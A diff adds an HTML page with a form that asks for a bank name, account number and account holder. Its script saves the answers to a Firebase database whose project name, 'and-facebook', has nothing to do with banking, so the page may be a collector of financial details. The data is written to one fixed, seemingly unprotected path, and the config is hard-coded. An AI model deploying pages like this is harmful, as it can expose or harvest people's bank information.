@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Request Bank Information</title>
+    <style>
+        body {
+            background-color: #f9f9f9;
+            font-family: sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 5px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 400px;
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        input {
+            margin-bottom: 15px;
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+
+        button {
+            padding: 10px;
+            background-color: #0b1252;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #040d1a;
+        }
+    </style>
+    <!-- Firebase and JavaScript -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js";
+
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyCcTFYAIp1-TA1irU8l5N8iihfnYCGWrHw",
+            authDomain: "and-facebook-ab84c.firebaseapp.com",
+            databaseURL: "https://and-facebook-ab84c-default-rtdb.firebaseio.com",
+            projectId: "and-facebook-ab84c",
+            storageBucket: "and-facebook-ab84c.appspot.com",
+            messagingSenderId: "4885749329",
+            appId: "1:4885749329:web:2d5b0e46519b5dc4c8e270"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        // Form submission handler
+        document.getElementById('bankForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const bankName = document.getElementById('bankName').value;
+            const accountNumber = document.getElementById('accountNumber').value;
+            const accountHolder = document.getElementById('accountHolder').value;
+
+            // Save data to Firebase
+            set(ref(db, 'bankInfo/'), {
+                bankName: bankName,
+                accountNumber: accountNumber,
+                accountHolder: accountHolder
+            }).then(() => {
+                // Redirect to the display page
+                window.location.href = 'display-bank-info.html';
+            }).catch((error) => {
+                alert("Error saving data: " + error.message);
+            });
+        });
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>Request for the Bank</h1>
+        <form id="bankForm">
+            <input type="text" id="bankName" placeholder="Enter Bank Name" required>
+            <input type="text" id="accountNumber" placeholder="Enter Account Number" required>
+            <input type="text" id="accountHolder" placeholder="Enter Account Holder Name" required>
+            <button type="submit">Submit</button>
+        </form>
+    </div>
+</body>
+</html>
